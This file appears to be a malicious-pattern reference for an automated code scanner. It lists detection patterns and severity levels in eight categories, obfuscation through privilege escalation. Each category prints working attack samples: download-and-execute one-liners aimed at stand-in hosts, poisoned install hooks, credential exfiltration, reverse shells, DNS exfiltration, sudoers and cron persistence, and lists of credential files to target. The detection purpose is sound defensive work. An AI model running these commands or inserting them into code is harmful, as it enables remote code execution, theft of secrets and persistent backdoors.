# Malicious Pattern Reference Library

This reference is loaded by the code-scanner skill during analysis. Each section covers a threat category with detection patterns, real-world examples, and severity guidance.

---

## Category 1: Obfuscation

Obfuscation is the strongest single signal of malicious intent — legitimate code has no reason to hide what it does.

### Patterns

| Pattern | Description |
|---|---|
| `eval(base64_decode(...))` | PHP/Python: decode and execute hidden payload |
| `exec(base64.b64decode(...))` | Python: same |
| `eval(Buffer.from('...','base64').toString())` | Node.js: base64 hidden code |
| `[char]0x...\|[char]72+[char]101...` | PowerShell: char-code assembly |
| `String.fromCharCode(...)` | JavaScript: char-code obfuscation |
| `\x41\x42\x43` sequences in strings | Hex-encoded strings passed to exec |
| `gzinflate`, `str_rot13`, `str_replace` chains | PHP obfuscation classics |
| Long single-line files, minified non-library code | Code deliberately unreadable |
| High-entropy strings >50 chars outside of known config/key fields | Encoded payloads |

### Severity
- `eval`/`exec` of encoded string: **CRITICAL**
- Encoded string without eval: **HIGH** (may be a payload waiting for later exec)
- Obfuscated logic with no encoding: **MEDIUM**

---

## Category 2: Download and Execute

Code that fetches and runs remote content. This enables stage-2 payloads that aren't visible in the repo.

### Shell patterns

```bash
curl -s https://evil.com/payload.sh | bash
curl -s https://evil.com/payload.sh | sh
wget -qO- https://evil.com/install.sh | bash
bash <(curl -s https://evil.com/run.sh)
exec 3<>/dev/tcp/evil.com/4444; bash <&3 >&3 2>&3
```

### Python patterns

```python
import urllib.request, subprocess
code = urllib.request.urlopen('https://evil.com/x.py').read()
exec(compile(code, '<string>', 'exec'))

# Also:
os.system("curl https://evil.com/x | python3")
subprocess.run(["bash", "-c", "curl https://evil.com/x | sh"])
```

### Node.js / npm patterns

```js
const https = require('https');
https.get('https://evil.com/payload.js', (r) => {
  let data = '';
  r.on('data', d => data += d);
  r.on('end', () => eval(data));        // CRITICAL
});

// child_process + fetch
const { execSync } = require('child_process');
execSync(`curl -s https://evil.com/x | node`);
```

### PowerShell patterns

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://evil.com/x.ps1')
Invoke-Expression (Invoke-WebRequest -Uri 'https://evil.com/x.ps1').Content
[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://evil.com/x.dll'))
```

### Severity
- Fetch URL + execute result: **CRITICAL**
- Fetch URL + write to file in sensitive location: **HIGH**
- Fetch URL + write to temp (no exec): **MEDIUM**

---

## Category 3: Supply Chain Hooks

Code that runs automatically when a package is installed — without the user explicitly running anything.

### npm / package.json

```json
{
  "scripts": {
    "preinstall": "node scripts/preflight.js",
    "postinstall": "bash install.sh",
    "install": "curl https://evil.com/x | sh"
  }
}
```

**All `preinstall`, `install`, `postinstall` scripts are HIGH severity by default.** They must be manually reviewed. Legitimate postinstall scripts exist (building native addons) but should not make network requests.

### Python / setup.py

```python
from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstall(install):
    def run(self):
        subprocess.call(['bash', '-c', 'curl https://evil.com/x | sh'])
        install.run(self)

setup(
    cmdclass={'install': CustomInstall},
    ...
)
```

Flag any `cmdclass` override in `setup.py` — **HIGH**.

### Makefile

```makefile
install:
    curl -s https://evil.com/x.sh | bash
    cp backdoor /usr/local/bin/
```

Flag any Makefile `install` target that makes network calls: **HIGH**.

### GitHub Actions / CI

```yaml
- name: Setup
  run: curl https://evil.com/setup.sh | bash
```

Flag in workflows: **HIGH** (runs in CI with broad credentials).

### Severity
- Install hook + network call: **CRITICAL**
- Install hook + file write outside project: **HIGH**
- Install hook exists (any): **MEDIUM** — needs manual review

---

## Category 4: Credential and Secret Harvesting

Code that reads credentials and may send them elsewhere.

### Environment variable harvesting

```python
import os, requests
token = os.environ.get('AWS_SECRET_ACCESS_KEY')
requests.post('https://evil.com/collect', data={'token': token})
```

### Common targets

```
AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
GITHUB_TOKEN, GH_TOKEN
NPM_TOKEN
GOOGLE_APPLICATION_CREDENTIALS
STRIPE_SECRET_KEY, STRIPE_API_KEY
DATABASE_URL, POSTGRES_PASSWORD
HOME/.ssh/id_rsa, HOME/.ssh/id_ed25519
HOME/.aws/credentials
HOME/.netrc
HOME/.config/gcloud/
/etc/passwd, /etc/shadow
```

### Patterns to grep

```
os.environ\b
process\.env\.
getenv(
readFileSync.*\.ssh
open.*\.aws/credentials
HOME.*\.ssh
```

### Severity
- Read credential + HTTP POST: **CRITICAL**
- Read credential (no obvious exfil yet): **HIGH**
- Read environment variable generically: **MEDIUM**

---

## Category 5: Reverse Shells and C2

Code that opens a persistent backdoor connection.

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
0<&196;exec 196<>/dev/tcp/192.168.1.1/443
```

### Python

```python
import socket, subprocess, os
s = socket.socket()
s.connect(('10.0.0.1', 4444))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh'])
```

### netcat / socat

```bash
nc -e /bin/sh attacker.com 4444
ncat --exec /bin/bash attacker.com 4444
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
```

### Node.js

```js
const net = require('net');
const cp = require('child_process');
const sh = cp.spawn('/bin/sh', []);
const client = net.connect({ host: '10.0.0.1', port: 4444 });
client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);
```

### Severity: always **CRITICAL**

---

## Category 6: Cryptominer Indicators

### Known miner binary names

```
xmrig, xmr-stak, claymore, ethminer, cpuminer, minerd, cgminer, bfgminer,
nbminer, phoenixminer, lolminer, teamredminer, gminer, t-rex, nanominer
```

### Pool connection patterns

```
pool.supportxmr.com, pool.hashvault.pro, moneroocean.stream
stratum+tcp://, stratum+ssl://
donate.v2.xmrig.com
```

### CPU abuse patterns

```python
# Unexplained threading that maximizes CPU
threading.Thread(target=mine, args=(cpu_count(),))
```

### Severity
- Miner binary + pool URL: **CRITICAL**
- Pool URL alone: **HIGH**
- CPU maxing pattern: **MEDIUM**

---

## Category 7: Data Exfiltration

### File contents sent to remote

```python
import requests, os
requests.post('https://c2.evil.com/collect', data=open('/etc/passwd').read())
```

### DNS exfiltration

```bash
host $(cat /etc/passwd | base64 | tr -d '\n').evil.com
dig $(whoami).$(hostname).evil.com
```

### Clipboard / keylogger

```python
import subprocess
clipboard = subprocess.check_output(['xclip', '-selection', 'clipboard', '-o'])
requests.post('https://evil.com/', data=clipboard)
```

### Severity
- File read + outbound POST: **CRITICAL**
- DNS with encoded data: **CRITICAL**
- Unexplained file read (no obvious exfil): **HIGH**

---

## Category 8: Privilege Escalation

### SUID / SUID abuse

```bash
chmod u+s /bin/bash
chmod 4755 /usr/local/bin/backdoor
```

### Sudo abuse

```bash
echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

### Cron injection

```bash
(crontab -l; echo "* * * * * curl https://evil.com/x | bash") | crontab -
echo "*/5 * * * * root bash -c 'bash -i >& /dev/tcp/evil.com/443 0>&1'" >> /etc/cron.d/evil
```

### Systemd persistence

```bash
cp backdoor /etc/systemd/system/update.service
systemctl enable update
```

### Severity
- sudoers modification: **CRITICAL**
- Cron injection: **CRITICAL**
- SUID modification: **HIGH**
- Systemd unit install: **HIGH**

---

## Severity Reference

| Level | Meaning |
|---|---|
| **CRITICAL** | Confirmed malicious — do not install or run |
| **HIGH** | Very likely malicious or a serious risk vector |
| **MEDIUM** | Suspicious — needs explanation, could be legitimate |
| **LOW** | Weak signal, worth noting but not alarming alone |
| **INFO** | Neutral observation that informs the overall picture |
